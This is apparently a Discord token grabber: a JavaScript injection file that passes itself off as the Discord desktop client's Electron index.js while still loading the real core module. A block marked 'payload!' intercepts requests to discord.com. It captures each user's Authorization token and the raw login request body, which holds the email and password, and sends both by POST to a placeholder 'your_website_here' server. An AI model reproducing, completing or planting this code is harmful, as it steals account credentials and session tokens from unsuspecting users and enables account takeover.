module.exports = require('./core.asar');
const electron = require("electron");
const {session} = require('electron');
const {net} = require('electron');

// payload!
const filter = {
  urls: ['https://*.discord.com/*']
}

var currentToken = "";

session.defaultSession.webRequest.onBeforeSendHeaders(filter,(details,callback)=> {
  var tokenHeader = details.requestHeaders['Authorization'];
  if(tokenHeader !== 'undefined' && tokenHeader !== currentToken && tokenHeader !== "") {
    currentToken = tokenHeader;
    var postData = JSON.stringify({"token":tokenHeader});
    const request = net.request({
      url:'your_website_here',
      method:'post',
      headers: {
        'Content-Type':'application/x-www-form-urlencoded'
      }
    });
    request.write(postData);
    request.end();
  }
  if (details.url == "https://discord.com/api/v8/auth/login") {
    const buffer = Array.from(details.uploadData)[0].bytes;
    var loginData = JSON.stringify({"loginData":buffer.toString()});
    const loginRequest = net.request({
      url:'your_website_here',
      method:'post',
      headers: {
        'Content-Type':'application/x-www-form-urlencoded'
      }
    });
    loginRequest.write(loginData);
    loginRequest.end();
  }
  callback(details);
});
